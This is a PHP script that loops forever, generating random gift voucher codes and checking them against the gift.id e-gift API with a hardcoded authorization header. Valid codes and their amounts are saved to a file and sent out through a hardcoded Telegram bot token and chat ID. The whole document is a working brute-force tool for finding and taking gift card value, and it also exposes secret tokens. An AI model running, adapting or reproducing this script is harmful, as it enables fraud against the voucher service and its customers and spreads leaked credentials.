<?php
error_reporting(0);
function request($url, $post = null, $cookies = null, $headers = null)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    if(!is_null($headers))
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    if(!is_null($cookies))
        curl_setopt($ch, CURLOPT_COOKIE, $cookies);
    if(!is_null($post)){
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }
    $resp = curl_exec($ch);
    $header_len = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $header = substr($resp, 0, $header_len);
    $body = substr($resp, $header_len);
    curl_close($ch);
    preg_match_all('#Set-Cookie: ([^;]+)#', $header, $d);
    $cookie = '';
    for ($o=0;$o<count($d[0]);$o++) {
        $cookie.=$d[1][$o].";";
    }
    return [$header, $body, $cookie];
}

function random($length = 9) {
    $characters = 
'0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, 
$charactersLength - 1)];
    }
    return $randomString;
}
$i=0;
while(true)
{ 
$code  = "83".random()."46";
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://api.gift.id/v1/egifts/detail_by_code/'.$code.'");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");

curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = "Authorization: Basic VnFPZHhxTmo5cjNTQk1nNEdjMkNDdGs2czpWR2ZOOFNMNjVJSGNSNmtsTzlhOFJrcnhDMVUwaEttdEgySUgwaVZ0SnUxNGpNTUJnQQ==";
$headers[] = "Origin: https://e.gift.id";
$headers[] = "Accept-Encoding: gzip, deflate, br";
$headers[] = "Accept-Language: en-US,en;q=0.9";
$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36";
$headers[] = "Accept: application/json, text/plain, */*";
$headers[] = "Referer: https://e.gift.id/u/83f5vbm5bdb46";
$headers[] = "Authority: api.gift.id";
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close ($ch);
$dekode = json_decode($result, 1);
$amount = $dekode[amount];
$mesej = $dekode[message];
if(empty($amount))
	{
	echo "[$i] DIE => https://e.gift.id/u/{$code} [".$mesej."] 
".PHP_EOL;
	} else { 
	file_put_contents("live.txt", 
"\nhttps://e.gift.id/u/{$code} | Amount: 
{$amount} | Status: {$status}", FILE_APPEND);
	echo "[".$i."] LIVE => https://e.gift.id/u/{$code} [".$amount."] [".$status."]".PHP_EOL;
    $telegramId = '579998914';
    $messages = urlencode("Your TADA Result:

[".$i."] LIVE => https://e.gift.id/u/{$code} [".$amount."] [".$status."]");
    $url = 'https://api.telegram.org/bot729627281:AAHpQPm4-av4ubzNE9eCR8wgkF80gaANMSU/sendMessage?parse_mode=markdown&chat_id='.$telegramId.'&text='.$messages;
    $send = request($url, null, null, null);
    }
$i++;
sleep(3);
}
?>